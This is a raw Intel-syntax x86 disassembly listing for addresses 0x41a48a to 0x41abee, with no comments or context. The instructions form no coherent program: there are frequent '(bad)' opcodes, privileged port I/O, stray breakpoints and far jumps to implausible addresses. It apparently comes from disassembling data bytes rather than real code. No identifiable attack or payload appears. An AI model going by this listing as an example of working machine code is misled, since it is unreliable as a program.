  41a48a:	jb     0x41a44f
  41a48c:	adc    dh,ah
  41a48e:	or     dh,BYTE PTR [ebx]
  41a490:	push   esp
  41a491:	popf   
  41a492:	mov    ecx,DWORD PTR [edi-0x29]
  41a495:	cmc    
  41a496:	cmp    esp,edi
  41a498:	int3   
  41a499:	pop    edi
  41a49a:	ds jg  0x41a4c2
  41a49d:	outs   dx,DWORD PTR ds:[esi]
  41a49e:	scas   al,BYTE PTR es:[edi]
  41a49f:	sbb    dh,BYTE PTR [edx+ebp*1]
  41a4a2:	inc    ebx
  41a4a3:	adc    al,0x56
  41a4a5:	add    ecx,DWORD PTR [ecx]
  41a4a7:	int3   
  41a4a8:	sbb    ecx,DWORD PTR [eax-0x39dbf3fc]
  41a4ae:	and    DWORD PTR [ecx],ebx
  41a4b0:	dec    ecx
  41a4b1:	xchg   esi,eax
  41a4b2:	or     eax,0xd4f41d30
  41a4b7:	call   0xdecffccc
  41a4bc:	popa   
  41a4bd:	scas   al,BYTE PTR es:[edi]
  41a4be:	icebp  
  41a4bf:	and    dl,dh
  41a4c1:	cmp    DWORD PTR [edx-0x56ab3160],0xffffffd7
  41a4c8:	mov    edx,0x6537b637
  41a4cd:	jne    0x41a4bd
  41a4cf:	push   esp
  41a4d0:	sub    DWORD PTR [eax-0x50],ebp
  41a4d3:	xchg   edi,eax
  41a4d4:	inc    esp
  41a4d5:	xor    DWORD PTR [ebp+0x768554f1],ebp
  41a4db:	dec    ebx
  41a4dc:	lock jnp 0x41a49f
  41a4df:	hlt    
  41a4e0:	loopne 0x41a509
  41a4e2:	stos   DWORD PTR es:[edi],eax
  41a4e3:	loop   0x41a519
  41a4e5:	mov    bh,0x50
  41a4e7:	pop    es
  41a4e8:	cmp    eax,0x4998068b
  41a4ed:	and    esi,DWORD PTR [esi-0x21ea8402]
  41a4f3:	in     al,dx
  41a4f4:	mov    edx,edx
  41a4f6:	cdq    
  41a4f7:	mov    ecx,0xb1a1dba4
  41a4fc:	fidiv  WORD PTR [edi+edx*1+0x2fb701d3]
  41a503:	push   esi
  41a504:	fs data16 gs das 
  41a508:	add    eax,DWORD PTR [ecx]
  41a50a:	mov    dh,0x90
  41a50c:	mul    dh
  41a50e:	leave  
  41a50f:	add    ah,BYTE PTR [edi]
  41a511:	jne    0x41a4f3
  41a513:	sti    
  41a514:	lea    esp,[edi]
  41a516:	cmp    al,ch
  41a518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a519:	cmp    eax,0xa8ccd3cf
  41a51e:	xor    BYTE PTR [eax+0x10],cl
  41a521:	loop   0x41a531
  41a523:	in     eax,dx
  41a524:	ficom  WORD PTR [ebx-0x24]
  41a527:	jp     0x41a5a8
  41a529:	bnd ja 0x41a50b
  41a52c:	dec    ebp
  41a52d:	cli    
  41a52e:	cmc    
  41a52f:	push   cs
  41a530:	mov    cs,WORD PTR [esi]
  41a532:	and    BYTE PTR [esi-0x2102d7b2],ch
  41a538:	lds    eax,FWORD PTR [edx-0x4d]
  41a53b:	rcr    DWORD PTR [edx],1
  41a53d:	fisubr DWORD PTR [edi]
  41a53f:	pop    ebx
  41a540:	dec    ecx
  41a541:	cmp    al,bh
  41a543:	ins    DWORD PTR es:[edi],dx
  41a544:	daa    
  41a545:	imul   ebx,DWORD PTR [ecx+0x451fd528],0x8a28da1f
  41a54f:	into   
  41a550:	inc    esp
  41a551:	test   eax,0x79806257
  41a556:	jne    0x41a5bf
  41a558:	lahf   
  41a559:	jecxz  0x41a505
  41a55b:	adc    eax,0xbc71d35
  41a560:	fmul   DWORD PTR [ecx+0x4]
  41a563:	test   eax,0x4011f101
  41a568:	fs fwait
  41a56a:	je     0x41a531
  41a56c:	and    cl,ah
  41a56e:	and    al,0xd2
  41a570:	js     0x41a57b
  41a572:	in     al,dx
  41a573:	jno    0x41a53e
  41a575:	aam    0x5a
  41a577:	test   DWORD PTR [ecx-0x28],0x5b0dce8a
  41a57e:	mov    edi,0x231296a2
  41a583:	xchg   DWORD PTR [esi+0x7a],ecx
  41a586:	inc    ebx
  41a587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a588:	(bad)  
  41a589:	repnz cwde 
  41a58b:	arpl   WORD PTR [ebx],dx
  41a58d:	inc    eax
  41a58e:	dec    edi
  41a58f:	(bad)
  41a592:	xchg   dh,bh
  41a594:	sbb    DWORD PTR [edi+eax*2],ecx
  41a597:	inc    ebp
  41a598:	repz out dx,eax
  41a59a:	jl     0x41a60f
  41a59c:	icebp  
  41a59d:	stos   BYTE PTR es:[edi],al
  41a59e:	(bad)  [eax+0x7a]
  41a5a1:	out    dx,al
  41a5a2:	outs   dx,BYTE PTR ds:[esi]
  41a5a3:	add    DWORD PTR [ebx-0x5806bf4c],esp
  41a5a9:	cmp    BYTE PTR [esi+eax*1-0x7fe0d1c7],ah
  41a5b0:	int    0x9b
  41a5b2:	sahf   
  41a5b3:	sar    edi,1
  41a5b5:	mov    cl,0xb3
  41a5b7:	scas   eax,DWORD PTR es:[edi]
  41a5b8:	jmp    0x8fb96747
  41a5bd:	adc    BYTE PTR [ecx],dh
  41a5bf:	and    BYTE PTR ss:[edx],0x32
  41a5c3:	lock or BYTE PTR [esi+0x5c],0x7a
  41a5c8:	xchg   ah,ah
  41a5ca:	test   eax,0x55a7480e
  41a5cf:	or     cl,dh
  41a5d1:	push   ebx
  41a5d2:	jmp    0x805d00d3
  41a5d7:	loopne 0x41a633
  41a5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5da:	jae    0x41a5d3
  41a5dc:	test   al,0x18
  41a5df:	xchg   edx,eax
  41a5e0:	jbe    0x41a628
  41a5e2:	add    cl,bh
  41a5e4:	shl    DWORD PTR ds:0x140384b5,0x3
  41a5eb:	push   ebp
  41a5ec:	pop    esi
  41a5ed:	in     eax,dx
  41a5ee:	sbb    al,BYTE PTR [edx+0x7c]
  41a5f1:	mov    edx,0xe12657c9
  41a5f6:	fnstcw WORD PTR [esi+0x7009198]
  41a5fc:	retf   0xe410
  41a5ff:	xchg   edi,eax
  41a600:	mov    ?,WORD PTR [ebp+edi*8+0x7b571fae]
  41a607:	ds daa 
  41a609:	mov    dh,0xc2
  41a60b:	mov    dl,BYTE PTR [esi-0xfb3b777]
  41a611:	dec    ebx
  41a612:	imul   esi,DWORD PTR [ebp-0x4b],0x464c9843
  41a619:	add    eax,0x399f547c
  41a61e:	dec    edi
  41a61f:	aad    0x7b
  41a621:	pop    edx
  41a622:	mov    ebx,DWORD PTR ds:0x2294338a
  41a628:	or     dl,cl
  41a62a:	arpl   dx,ax
  41a62c:	int3   
  41a62d:	sbb    BYTE PTR [eax+0xf681a3c],cl
  41a633:	push   eax
  41a634:	int3   
  41a635:	ins    DWORD PTR es:[edi],dx
  41a636:	xor    DWORD PTR [ebp-0x540b1413],0xc1361766
  41a640:	xor    al,0x1a
  41a642:	ds and eax,0x6d8fe542
  41a648:	loope  0x41a689
  41a64a:	push   edi
  41a64b:	or     edx,DWORD PTR [ebp-0x76]
  41a64e:	jmp    0x41a62e
  41a650:	inc    esi
  41a651:	add    eax,0xf0f06506
  41a656:	ret    0x86
  41a659:	fcmovbe st,st(0)
  41a65b:	in     eax,0x4b
  41a65d:	stos   DWORD PTR es:[edi],eax
  41a65e:	adc    DWORD PTR [eax],edx
  41a660:	mov    al,0xb2
  41a662:	jnp    0x41a5f2
  41a664:	add    al,0x96
  41a666:	js     0x41a664
  41a668:	pop    ebp
  41a669:	rol    DWORD PTR [esi-0x6cac44b3],0xb2
  41a670:	(bad)  
  41a672:	and    al,0x80
  41a674:	pusha  
  41a675:	repnz stos DWORD PTR es:[edi],eax
  41a677:	mov    ebx,0x58b93247
  41a67c:	cmp    al,0x15
  41a67e:	test   DWORD PTR [ebx],esp
  41a680:	inc    esp
  41a681:	stos   DWORD PTR es:[edi],eax
  41a682:	shl    esp,0x43
  41a685:	dec    ebx
  41a686:	cmp    al,0xbf
  41a688:	ret    0x8bbc
  41a68b:	push   ss
  41a68c:	test   BYTE PTR ds:[ebx],0xf5
  41a690:	or     dh,ch
  41a692:	mov    edx,0x3af44464
  41a697:	jnp    0x41a6a4
  41a699:	mov    ah,0x54
  41a69b:	mov    esi,DWORD PTR [edx]
  41a69d:	push   cs
  41a69e:	xor    BYTE PTR [edi+0x35ad5b1],dh
  41a6a4:	push   esp
  41a6a5:	in     al,dx
  41a6a6:	mov    cl,0x10
  41a6a8:	sub    DWORD PTR [edx-0x45b5eb7e],0xec7743b
  41a6b2:	push   0xccda2488
  41a6b7:	shr    BYTE PTR [eax],cl
  41a6b9:	jb     0x41a686
  41a6bb:	xchg   edi,eax
  41a6bc:	test   al,0xd6
  41a6be:	(bad)  
  41a6bf:	repnz pushf 
  41a6c1:	cmp    BYTE PTR [ebp-0x485214a4],dh
  41a6c7:	mov    ss,WORD PTR [esi-0x30]
  41a6ca:	in     eax,0xf3
  41a6cc:	int    0xbe
  41a6ce:	out    dx,eax
  41a6cf:	aad    0x83
  41a6d1:	mov    edx,0x39ec062c
  41a6d6:	xor    ebp,DWORD PTR [edx]
  41a6d8:	pushf  
  41a6d9:	push   0xfffffff7
  41a6db:	jb     0x41a710
  41a6dd:	sub    eax,0x3b732c95
  41a6e2:	outs   dx,BYTE PTR ds:[esi]
  41a6e3:	retf   
  41a6e4:	test   al,0x3a
  41a6e6:	sbb    DWORD PTR [edi+edx*4],esp
  41a6e9:	jge    0x41a74b
  41a6eb:	imul   edx,DWORD PTR [ecx-0x5a88026e],0x31f3eb45
  41a6f5:	add    BYTE PTR [edi+0x4e],cl
  41a6f8:	pushf  
  41a6f9:	xchg   esp,eax
  41a6fa:	imul   ebp,ebp,0xfe263d20
  41a700:	cmp    ch,BYTE PTR [ebx+0x2b]
  41a703:	lahf   
  41a704:	adc    BYTE PTR [eax],ch
  41a706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a707:	out    dx,al
  41a708:	shr    BYTE PTR [edx],0xa0
  41a70b:	push   edi
  41a70c:	inc    edi
  41a70d:	in     eax,0x1e
  41a70f:	imul   edx,DWORD PTR [ebx-0x665e4729],0xfd71fe33
  41a719:	pop    eax
  41a71a:	cmp    DWORD PTR [esi+0x27a3534d],ebx
  41a720:	inc    edi
  41a721:	ret    0xd7e1
  41a724:	mov    WORD PTR [ebx+0x45],cs
  41a727:	inc    edx
  41a728:	inc    eax
  41a729:	das    
  41a72a:	js     0x41a758
  41a72c:	mov    eax,gs
  41a72e:	das    
  41a72f:	xchg   ebx,eax
  41a730:	retf   
  41a731:	adc    cl,bh
  41a733:	std    
  41a734:	sar    DWORD PTR [ebp+0x25],1
  41a737:	adc    DWORD PTR [ebx+0x45],0xffffffd0
  41a73b:	jp     0x41a742
  41a73d:	xchg   ah,bl
  41a73f:	dec    esp
  41a740:	clc    
  41a741:	bound  ecx,QWORD PTR [esi+edi*4-0x45f3f62e]
  41a748:	into   
  41a749:	inc    eax
  41a74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a74b:	pop    ds
  41a74c:	and    BYTE PTR [ecx+0x631cf20a],bh
  41a752:	adc    edi,DWORD PTR [edi-0x704a278]
  41a758:	and    esi,DWORD PTR [ecx+0x6ae1c412]
  41a75e:	clc    
  41a75f:	mov    eax,0xb44e8d5
  41a764:	mov    DWORD PTR [ebp-0x15],ebx
  41a767:	sahf   
  41a768:	push   eax
  41a769:	(bad)
  41a76d:	sbb    BYTE PTR [ebp-0x3c779be3],0x9b
  41a774:	test   esp,edx
  41a776:	cmp    BYTE PTR [ecx+0x54],dh
  41a779:	and    BYTE PTR [ebx],ch
  41a77b:	pop    es
  41a77c:	stos   DWORD PTR es:[edi],eax
  41a77d:	arpl   si,si
  41a77f:	dec    esi
  41a780:	sub    eax,0x813c5818
  41a785:	xor    BYTE PTR [edi-0x2562729e],cl
  41a78b:	stc    
  41a78c:	pop    esi
  41a78d:	into   
  41a78e:	out    0x89,al
  41a790:	shl    DWORD PTR cs:[esp+eiz*2],0xb8
  41a795:	es xor al,0x73
  41a798:	cmp    bh,BYTE PTR [ecx-0x5dbc9c50]
  41a79e:	push   0x6fc94623
  41a7a3:	and    BYTE PTR [ecx+0x4a],al
  41a7a6:	data16 sahf 
  41a7a8:	stc    
  41a7a9:	ds jecxz 0x41a7d0
  41a7ac:	es jmp 0x41a788
  41a7af:	inc    esp
  41a7b0:	pop    eax
  41a7b1:	ret    0x231d
  41a7b4:	call   0xed68d85f
  41a7b9:	mov    bl,0x89
  41a7bb:	and    al,0xec
  41a7bd:	cmp    eax,0xf2892c35
  41a7c2:	jbe    0x41a830
  41a7c4:	jns    0x41a842
  41a7c6:	add    BYTE PTR [ebp-0x4],ch
  41a7c9:	jmp    0x41a835
  41a7cb:	or     DWORD PTR [eax+ebp*8+0x2c],ebx
  41a7cf:	sbb    ebx,esi
  41a7d1:	push   ecx
  41a7d2:	clc    
  41a7d3:	aas    
  41a7d4:	shr    DWORD PTR [ebx-0x52f6027e],1
  41a7da:	mov    ch,ch
  41a7dc:	popa   
  41a7dd:	jns    0x41a822
  41a7df:	scas   al,BYTE PTR es:[edi]
  41a7e0:	add    bl,cl
  41a7e2:	xchg   ebx,eax
  41a7e3:	and    al,0xa6
  41a7e5:	inc    eax
  41a7e6:	push   ebx
  41a7e7:	stc    
  41a7e8:	mov    eax,DWORD PTR [ebx]
  41a7ea:	out    0x7e,eax
  41a7ec:	adc    BYTE PTR [eax+0x9b51a8c],ch
  41a7f2:	out    0xe5,al
  41a7f4:	jns    0x41a7dc
  41a7f6:	les    edx,FWORD PTR [eax+0x14]
  41a7f9:	xchg   ebp,eax
  41a7fa:	sub    ebp,DWORD PTR [edx-0x272ceb7e]
  41a800:	mov    bl,0x85
  41a802:	push   esi
  41a803:	repnz dec esp
  41a805:	nop
  41a806:	mov    ds:0x1ed7b7ef,al
  41a80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80c:	inc    edi
  41a80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a80e:	xlat   BYTE PTR ds:[ebx]
  41a80f:	add    edi,ebp
  41a811:	adc    edi,eax
  41a813:	adc    al,0x7e
  41a815:	mov    esi,0x2a8d4456
  41a81a:	adc    eax,DWORD PTR [edx]
  41a81c:	out    0xc8,al
  41a81e:	call   0xf240a158
  41a823:	mov    ds:0xca0559ee,al
  41a828:	add    BYTE PTR [ebx],bh
  41a82a:	sbb    BYTE PTR [ecx+0x70],dh
  41a82d:	pop    ecx
  41a82e:	add    bl,BYTE PTR [ecx]
  41a830:	out    dx,al
  41a831:	push   ebp
  41a832:	cmp    al,BYTE PTR [ebx]
  41a834:	xchg   esi,ebx
  41a836:	jb     0x41a8b7
  41a838:	sbb    eax,0xa3f076b0
  41a83d:	mov    DWORD PTR [edi-0x196abd93],edx
  41a843:	xlat   BYTE PTR ds:[ebx]
  41a844:	mov    BYTE PTR [ebx+edi*8-0x29],ch
  41a848:	and    cl,BYTE PTR [esi+0x4a]
  41a84b:	sbb    BYTE PTR [ecx*2-0x16dcd516],dh
  41a852:	inc    eax
  41a853:	dec    ebp
  41a854:	into   
  41a855:	xor    ah,BYTE PTR [edi]
  41a857:	sub    bh,BYTE PTR [edi]
  41a859:	dec    ebx
  41a85a:	dec    ebx
  41a85b:	inc    ebx
  41a85c:	push   ebx
  41a85d:	int    0xac
  41a85f:	idiv   BYTE PTR [edx+0x282f6f9a]
  41a865:	sub    eax,0x75ebab71
  41a86a:	push   0xae0c8547
  41a86f:	out    dx,al
  41a870:	adc    DWORD PTR [edi+0x52],edi
  41a873:	jns    0x41a8a4
  41a875:	mov    eax,0xc5664b21
  41a87a:	clc    
  41a87b:	mov    ds:0x80d064b5,al
  41a880:	mov    ecx,0x77ad51a7
  41a885:	push   ds
  41a886:	addr16 pop eax
  41a888:	(bad)  
  41a889:	mov    edx,0x2e043b8c
  41a88e:	imul   ebx,DWORD PTR [ebx+ebp*8-0x7b71b3fe],0x61579107
  41a899:	sti    
  41a89a:	imul   edi,DWORD PTR [ebx],0xffffffd3
  41a89d:	push   ds
  41a89e:	(bad)  
  41a89f:	push   ecx
  41a8a0:	and    DWORD PTR [eax],edx
  41a8a2:	ins    DWORD PTR es:[edi],dx
  41a8a3:	add    ebx,DWORD PTR [ecx]
  41a8a5:	cwde   
  41a8a6:	mov    edi,0x41306650
  41a8ab:	cmp    eax,0x2caa79f0
  41a8b0:	in     eax,dx
  41a8b1:	and    BYTE PTR [ecx+0x489ad9cf],0xc1
  41a8b8:	int3   
  41a8b9:	or     eax,0x6368be5e
  41a8be:	stos   BYTE PTR es:[edi],al
  41a8bf:	cli    
  41a8c0:	inc    ecx
  41a8c1:	fimul  WORD PTR [edx]
  41a8c3:	mov    edi,0xc46fa942
  41a8c8:	mov    ebp,0xad85876f
  41a8cd:	mov    ecx,0xda38e3e6
  41a8d2:	aad    0x40
  41a8d4:	repz push esp
  41a8d6:	or     eax,ecx
  41a8d8:	pop    ebp
  41a8d9:	push   edx
  41a8da:	retf   0x3d21
  41a8dd:	mov    al,ds:0x80618997
  41a8e2:	cwde   
  41a8e3:	push   0xf2c2ae4
  41a8e8:	dec    eax
  41a8e9:	out    0x20,eax
  41a8eb:	and    ah,al
  41a8ed:	mov    ebp,0x5b8ca558
  41a8f2:	outs   dx,DWORD PTR ds:[esi]
  41a8f3:	out    dx,al
  41a8f4:	fcomp  QWORD PTR [ebp-0x15]
  41a8f7:	push   0x45
  41a8f9:	retf   
  41a8fa:	lds    esi,FWORD PTR [ecx]
  41a8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8fd:	xchg   ebp,eax
  41a8fe:	aad    0xb3
  41a900:	cmp    BYTE PTR [ebx-0x61],bh
  41a903:	mov    ch,0xe9
  41a905:	and    DWORD PTR [ebx],esi
  41a907:	mov    bl,0x61
  41a909:	jge    0x41a8ae
  41a90b:	xor    bl,BYTE PTR [esp+ebx*4-0x26]
  41a90f:	popf   
  41a910:	push   ds
  41a911:	addr16 inc esp
  41a913:	aad    0xa1
  41a915:	or     BYTE PTR [eax],dl
  41a917:	imul   eax,edi,0x9
  41a91a:	inc    eax
  41a91b:	out    dx,eax
  41a91c:	jmp    0xfa1827d9
  41a921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a922:	pop    esp
  41a923:	inc    esp
  41a924:	inc    esi
  41a925:	inc    ebx
  41a926:	dec    ebp
  41a927:	and    eax,0xf2be12b4
  41a92c:	(bad)  
  41a92d:	fiadd  WORD PTR [ebx+0x19]
  41a930:	adc    al,0xb4
  41a932:	xchg   ebp,eax
  41a933:	into   
  41a934:	ss retf 
  41a936:	nop
  41a937:	int3   
  41a938:	and    al,0x67
  41a93a:	mov    dh,0x50
  41a93c:	arpl   WORD PTR [eax-0x2a],si
  41a93f:	sub    eax,0x85f9aab
  41a944:	shr    esi,0xbe
  41a947:	xor    eax,0x128000eb
  41a94c:	cmp    eax,ecx
  41a94e:	add    eax,0x2fbbed0
  41a953:	push   edx
  41a954:	adc    bh,dh
  41a956:	push   ecx
  41a957:	fmul   QWORD PTR [ebp+eax*2-0x40]
  41a95b:	(bad)
  41a95e:	or     DWORD PTR [eax],esi
  41a960:	add    al,0x32
  41a962:	fs jae 0x41a92f
  41a965:	mov    cl,BYTE PTR [ecx+0x2b]
  41a968:	test   eax,0x696719c0
  41a96d:	xor    DWORD PTR [esi+eiz*1],eax
  41a970:	loope  0x41a9c4
  41a972:	(bad)  
  41a973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a974:	mov    ds:0x71095cf4,eax
  41a979:	mov    edx,0xbddb6793
  41a97e:	icebp  
  41a97f:	xchg   bl,ch
  41a981:	loopne 0x41a908
  41a983:	pop    ss
  41a984:	in     al,dx
  41a985:	ja     0x41a9ba
  41a987:	push   esp
  41a988:	(bad)  
  41a989:	ins    DWORD PTR es:[edi],dx
  41a98a:	dec    ebx
  41a98b:	cmp    BYTE PTR [edi+ebx*1],dh
  41a98e:	cmp    eax,DWORD PTR [esi]
  41a990:	and    DWORD PTR [eax],ecx
  41a992:	or     al,0xd
  41a994:	hlt    
  41a995:	jne    0x41a985
  41a997:	sar    DWORD PTR [ecx+0x4d38fd6b],0x89
  41a99e:	mov    edx,ebx
  41a9a0:	adc    al,0x5e
  41a9a2:	mov    BYTE PTR [edx],ah
  41a9a4:	and    ecx,eax
  41a9a6:	pop    edi
  41a9a7:	mov    cl,0xb6
  41a9a9:	jae    0x41a997
  41a9ab:	xchg   dh,ah
  41a9ad:	jns    0x41a9f9
  41a9af:	xor    eax,0x5bb60da2
  41a9b4:	pop    ss
  41a9b5:	xor    DWORD PTR [edi],esi
  41a9b7:	adc    BYTE PTR [ebx+esi*1-0x5e9f91ff],0xad
  41a9bf:	or     BYTE PTR [eax+0xb],bh
  41a9c2:	mul    BYTE PTR [edi]
  41a9c4:	xor    al,0x6d
  41a9c6:	push   edx
  41a9c7:	fwait
  41a9c8:	lds    edi,FWORD PTR [ebx+0x60434afc]
  41a9ce:	add    BYTE PTR [eax],dh
  41a9d0:	xchg   esp,eax
  41a9d1:	loop   0x41a964
  41a9d3:	sahf   
  41a9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d5:	add    edx,DWORD PTR [esi+0x7a]
  41a9d8:	xchg   ebp,eax
  41a9d9:	loope  0x41a985
  41a9db:	enter  0x7a40,0xc4
  41a9df:	adc    eax,0x11e52b84
  41a9e4:	sub    DWORD PTR [edx-0x31603640],0xffffffb8
  41a9eb:	dec    esi
  41a9ec:	ins    DWORD PTR es:[edi],dx
  41a9ed:	dec    ebp
  41a9ee:	cmp    DWORD PTR [eax-0x52],esi
  41a9f1:	mov    ecx,0x994a58d9
  41a9f6:	push   cs
  41a9f7:	cli    
  41a9f8:	inc    ebp
  41a9f9:	cmc    
  41a9fa:	into   
  41a9fb:	pop    edx
  41a9fc:	mov    ebp,0x6cbb15cc
  41aa01:	xor    edi,DWORD PTR [edx+esi*4]
  41aa04:	mov    ds:0x218b6b2c,eax
  41aa09:	addr16 push ebx
  41aa0b:	leave  
  41aa0c:	sbb    DWORD PTR [edi+0x61],ebp
  41aa0f:	inc    esi
  41aa10:	xchg   esi,eax
  41aa11:	mov    ds,WORD PTR [edx-0x4ac22c61]
  41aa17:	fs arpl si,bp
  41aa1a:	push   esi
  41aa1b:	adc    eax,0x514d1739
  41aa20:	out    0xd,eax
  41aa22:	loop   0x41aa8e
  41aa24:	repz pop edi
  41aa26:	jmp    0x8ea7:0xd363442b
  41aa2d:	xor    ecx,DWORD PTR [ebp-0xd]
  41aa30:	push   ds
  41aa31:	fstp   QWORD PTR [ecx]
  41aa33:	inc    ecx
  41aa34:	lds    esi,FWORD PTR [ebp-0x15]
  41aa37:	jae    0x41aa54
  41aa39:	sar    BYTE PTR [esp+eax*4+0x5b0f7b2c],0xa4
  41aa41:	pop    edx
  41aa42:	scas   eax,DWORD PTR es:[edi]
  41aa43:	mov    BYTE PTR [edx],al
  41aa45:	sbb    al,0xff
  41aa47:	int3   
  41aa48:	mov    ah,0x3f
  41aa4a:	fist   DWORD PTR [edi+0x490b4c0]
  41aa50:	lods   eax,DWORD PTR ds:[esi]
  41aa51:	mov    al,ds:0x33462aa8
  41aa56:	and    dl,BYTE PTR [edx+edi*8-0x2d]
  41aa5a:	mov    dl,0xab
  41aa5c:	and    eax,0x82d39498
  41aa61:	call   0xfe8:0xf1231271
  41aa68:	dec    edx
  41aa69:	adc    eax,0xb68d832e
  41aa6e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41aa70:	call   DWORD PTR [esi-0x7e007727]
  41aa76:	and    BYTE PTR [eax+edi*8-0x6912b387],ah
  41aa7d:	jmp    0x41aa5e
  41aa7f:	outs   dx,DWORD PTR ds:[esi]
  41aa80:	call   0x3fcf280d
  41aa85:	jae    0x41aaf8
  41aa87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa88:	push   ss
  41aa89:	jns    0x41aa16
  41aa8b:	out    0x63,al
  41aa8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8e:	push   ebp
  41aa8f:	je     0x41aadd
  41aa91:	sub    eax,0xdc3e0e04
  41aa96:	sbb    DWORD PTR [edi-0x588f9ab1],edi
  41aa9c:	int    0x1e
  41aa9e:	out    0xe4,al
  41aaa0:	mov    al,ds:0x8423cc8
  41aaa5:	pop    ecx
  41aaa6:	xor    bl,ch
  41aaa8:	push   esp
  41aaa9:	(bad)  
  41aaaa:	jae    0x41aab2
  41aaac:	xchg   ebp,eax
  41aaad:	cwde   
  41aaae:	sub    al,0x42
  41aab0:	jge    0x41aa71
  41aab2:	(bad)  
  41aab3:	fcmovne st,st(4)
  41aab5:	sbb    cl,ah
  41aab7:	mov    ds:0x3aa811b5,eax
  41aabc:	popf   
  41aabd:	loop   0x41aa70
  41aabf:	sti    
  41aac0:	cmp    eax,0x538c7c7f
  41aac5:	aam    0x98
  41aac7:	scas   eax,DWORD PTR es:[edi]
  41aac8:	add    ah,bl
  41aaca:	cmp    BYTE PTR ds:0xc9a7a563,al
  41aad0:	add    BYTE PTR [eax],0x43
  41aad3:	(bad)  
  41aad4:	mov    eax,0x42a5a0e8
  41aad9:	clc    
  41aada:	fbstp  TBYTE PTR ds:0x3595f9e6
  41aae0:	jp     0x41aa73
  41aae2:	mov    dh,0xeb
  41aae4:	mov    ds:0x2113b999,eax
  41aae9:	lea    eax,[ebp-0x147ffaa6]
  41aaef:	cwde   
  41aaf0:	add    DWORD PTR [eax-0x53048e77],edx
  41aaf6:	loopne 0x41aaa7
  41aaf8:	push   ax
  41aafa:	fidiv  DWORD PTR ds:[esp+edx*8+0x39]
  41aaff:	(bad)  
  41ab00:	fnsave [eax+0x3a]
  41ab03:	pop    es
  41ab04:	jmp    0x790ea65e
  41ab09:	cmp    DWORD PTR [eax+0x38],edx
  41ab0c:	loope  0x41aabf
  41ab0e:	rcr    DWORD PTR [ebx+ebp*1],cl
  41ab11:	push   0x8a9fb6b5
  41ab16:	add    al,0x36
  41ab18:	xor    bl,cl
  41ab1a:	es dec eax
  41ab1c:	addr16 cmp al,0x6a
  41ab1f:	shl    BYTE PTR [esi+edx*4-0x17],0x25
  41ab24:	dec    ecx
  41ab25:	call   0xe9213f69
  41ab2a:	stc    
  41ab2b:	int    0xb8
  41ab2d:	es push ebx
  41ab2f:	mov    cl,0x17
  41ab31:	pop    edx
  41ab32:	and    al,0x57
  41ab34:	inc    edx
  41ab35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab36:	daa    
  41ab37:	sub    al,0x45
  41ab39:	test   al,0x23
  41ab3b:	pop    ss
  41ab3c:	push   ss
  41ab3d:	adc    DWORD PTR [edx+0xd],esp
  41ab40:	(bad)  
  41ab41:	retf   
  41ab42:	push   ecx
  41ab43:	and    bh,cl
  41ab45:	cmp    esp,DWORD PTR [ebx]
  41ab47:	dec    ecx
  41ab48:	push   esp
  41ab49:	inc    edx
  41ab4a:	pusha  
  41ab4b:	add    ebp,DWORD PTR [ebx+0x71]
  41ab4e:	test   BYTE PTR ds:0x6b996dab,al
  41ab54:	stc    
  41ab55:	out    dx,al
  41ab56:	loope  0x41ab2b
  41ab58:	xchg   ah,bl
  41ab5a:	jg     0x41ab9c
  41ab5c:	or     BYTE PTR [ecx-0x11],0xe5
  41ab60:	scas   eax,DWORD PTR es:[edi]
  41ab61:	retf   0x161c
  41ab64:	pop    ecx
  41ab65:	push   ss
  41ab66:	sub    eax,0xa9b95ab8
  41ab6b:	cmp    BYTE PTR [ecx],al
  41ab6d:	popf   
  41ab6e:	popa   
  41ab6f:	cmp    DWORD PTR gs:[ebp-0x49],0xa01e5f2c
  41ab77:	dec    esp
  41ab78:	ja     0x41ab57
  41ab7a:	cs test eax,0x2bbe3866
  41ab80:	iret   
  41ab81:	xchg   edx,eax
  41ab82:	push   DWORD PTR [bx+di+0x430]
  41ab87:	xor    BYTE PTR [esi],bh
  41ab89:	loope  0x41abee
  41ab8b:	jb     0x41ab12
  41ab8d:	mov    esi,DWORD PTR [ebp-0x24608bae]
  41ab93:	mov    ebp,cs
  41ab95:	dec    esi
  41ab96:	test   al,0x70
  41ab98:	stc    
  41ab99:	retf   
  41ab9a:	aam    0x5d
  41ab9c:	dec    edi
  41ab9d:	xchg   esp,eax
  41ab9e:	sbb    eax,DWORD PTR [esi]
  41aba0:	jbe    0x41ab28
  41aba2:	jno    0x41ab31
  41aba4:	sbb    WORD PTR [edi],0x2f
  41aba8:	ja     0x41abe7
  41abaa:	lods   eax,DWORD PTR ds:[esi]
  41abab:	retf   
  41abac:	dec    ecx
  41abad:	adc    ecx,ecx
  41abaf:	push   cs
  41abb0:	ret    
  41abb1:	retf   
  41abb2:	das    
  41abb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb4:	dec    eax
  41abb5:	jae    0x41abf8
  41abb7:	mov    ecx,0x54825969
  41abbc:	xor    ah,ah
  41abbe:	push   cs
  41abbf:	lds    ecx,FWORD PTR [eax+0x48]
  41abc2:	mov    eax,ds:0xfc0f8083
  41abc7:	inc    ecx
  41abc8:	push   ebx
  41abc9:	jmp    0xf505:0x9c76fb5f
  41abd0:	add    cl,BYTE PTR [edx]
  41abd2:	cs fwait
  41abd4:	gs ins DWORD PTR es:[edi],dx
  41abd6:	pop    es
  41abd7:	and    DWORD PTR [edx+eiz*8+0x13],0xffffffc7
  41abdc:	mov    ds:0xd8f96091,al
  41abe1:	(bad)  
  41abe2:	sbb    eax,0xf1fd24af
  41abe7:	mov    fs,esp
  41abe9:	or     eax,0x215ec6af
  41abee:	inc    edx
